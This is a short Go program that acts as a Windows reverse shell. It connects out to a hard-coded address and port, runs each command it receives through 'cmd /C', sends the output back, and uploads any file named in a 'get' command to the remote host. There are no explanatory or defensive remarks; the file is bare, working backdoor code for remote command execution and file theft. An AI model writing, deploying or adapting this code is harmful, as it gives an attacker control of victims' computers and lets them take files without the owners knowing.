package main

import (
	"bufio"
	"fmt"
	"io"
	"log"
	"net"
	"os"
	"os/exec"
	"strconv"
	"strings"
)

const BUFFSIZE = 1024

func main() {
	var buff []byte
	var command string
	conn, _ := net.Dial("tcp", "192.168.100.7:4455")
	buff = make([]byte, 512)

	//bufio.NewReader(os.Stdin)
	//fmt.Print(">>")
	//input, _ := reader.ReadString('\n')

	//defer conn.Close()
	//if err !=nil{
	for {
		n, _ := conn.Read(buff[0:])
		command = string(buff[0:n])
		if strings.Index(command, "get") == 0 {
			fname := strings.Split(command, " ")[1]
			fmt.Println(fname)
			//time.Sleep(5)
			//getfile(conn, fname)
			go sendFile(conn, fname)
			fmt.Println("Successfully return back to main func")

		} else if strings.Index(command, "kill") == 0 {
			conn.Close()
			os.Exit(1)

		} else {

			out, _ := exec.Command("cmd", "/C", string(buff[0:n])).Output()
			fmt.Println(string(out))
			conn.Write([]byte(out))
			out = out[:0]
		}
	}
	//}
}

func checkerror(err error) {
	if err != nil {
		fmt.Println("error while open file")
		waiti := bufio.NewScanner(os.Stdin)
		waiti.Scan()
		log.Fatal(err)
	}

}

func sendFile(connection net.Conn, fname string) {

	fmt.Println("A client has connected!")

	file, _ := os.Open(strings.TrimSpace(fname))
	//checkerror(err)

	fileInfo, err := file.Stat()
	if err != nil {
		fmt.Println(err)
		return
	}
	fileSize := padString(strconv.FormatInt(fileInfo.Size(), 10), 10)
	fileName := padString(fileInfo.Name(), 64)
	fmt.Println("Sending filename and filesize!")
	connection.Write([]byte(fileSize))
	connection.Write([]byte(fileName))
	sendBuffer := make([]byte, BUFFSIZE)
	fmt.Println("Start sending file!")
	for {
		_, err = file.Read(sendBuffer)
		if err == io.EOF {
			break
		}
		connection.Write(sendBuffer)
	}
	fmt.Println("File has been sent!")
	return
}

func padString(retunString string, toLength int) string {
	for {
		lengtString := len(retunString)
		if lengtString < toLength {
			retunString = retunString + ":"
			continue
		}
		break
	}
	return retunString
}
